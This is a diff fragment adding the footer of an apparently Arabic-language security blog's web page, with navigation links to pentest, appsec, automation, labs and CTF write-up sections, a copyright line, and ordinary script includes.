+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
